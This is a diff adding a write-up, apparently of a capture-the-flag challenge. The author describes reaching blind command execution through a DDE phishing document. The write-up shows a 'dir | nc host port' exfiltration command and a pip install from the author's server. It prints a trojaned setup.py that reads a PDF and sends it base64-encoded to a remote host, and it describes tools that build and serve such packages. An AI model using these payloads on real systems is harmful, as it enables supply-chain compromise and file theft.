@@ -1,0 +1,77 @@
+Early on in the challenge, the EWA and EMI systems had some reliabilty issues.
+Using the DDE exploit it took a while to get any command execution to work.
+Any attempt to run a more complicated command would fail.
+
+I wasn't sure if my commands were failing due to quoting or escapting issues or
+even how to tell.  Eventually it was determined that even a previously known
+working =dir | nc host port= command was failing almsot every time.  Any
+experiment I could come up with was tainted by the lack of reliability on the
+backend.  Not only was it a blind command injection exploit, but if an attempt
+failed I had no way of knowing why.  I needed to run something I KNEW would
+work that would also confirm it had been executed.
+
+I was able to use =dir= and =nc= to determine that python was installed, and I
+was able to run =python -V=.  Once I knew I could run python and pass it
+arguments, I ran {{{abbr(the standard python package installation tool, pip)}}}
+
+#+BEGIN_SRC
+python -m pip install https://my.vps.domain/test.tar.gz
+#+END_SRC
+
+A minute later, I got a hit for test.tar.gz!  The benefit of this method is
+that the command itself does not require any special characters that may need
+escaping.  There are no quotes or pipes or backslahes to worry about.  The fact
+that =pip= will initially request the file from my server also meant I knew the
+phish+dde exploit worked.  I could use this method as a solid base to run
+further experiments.  Once the =pip= command was worked out, the docx file did
+not need to be changed between runs.
+
+With =pip= working, it was a simple matter of putting together a trojaned
+setup.py in the style of [[https://twitter.com/JustinAzoff/status/881163562739277824][previous shenanigans seen in the wild]]
+
+The first trojaned package was written by hand:
+
+#+BEGIN_SRC python
+# setup.py
+from distutils.core import setup
+setup(name='upload_doc',
+      version='1.2',
+)
+#hax
+
+try:
+    import base64
+    import socket
+    with open("C:/GreatBookPage7.pdf", "rb") as f:
+        document = f.read()
+    encoded = base64.encodestring(document)
+
+    s=socket.socket()
+    s.connect(('my.vps.domain',44665))
+    s.send(encoded)
+    s.close()
+except Exception as e:
+    print("oops")
+    print(e)
+#+END_SRC
+
+I then ran
+
+#+BEGIN_SRC
+python setup.py sdist
+#+END_SRC
+
+to build the upload_doc-1.2.tar.gz tarball.  By copying this file to my vps,
+and having pip install it, it would run my python code.  Unfortunately EWA/EMI
+was having a lot of issues at this time, and it took almost 2 days before I was
+able to see this work.  Fortunately, because I was now using a known good docx
+file, I knew the problem was not on my end.
+
+The trojanpkg.py module automates this by building a tarball in memory based on
+an arbitrary injected code block.  This enables the destination address to be
+templated in on the fly, instead of hardcoded in the package.  This enabled
+other members of my team to run the exploit code without having to edit the
+source to match their environment.
+
+The trojanpkgweb.py module builds on top of trojanpkg.py to start up a web
+server that dynamically serves up a trojaned package for any url.
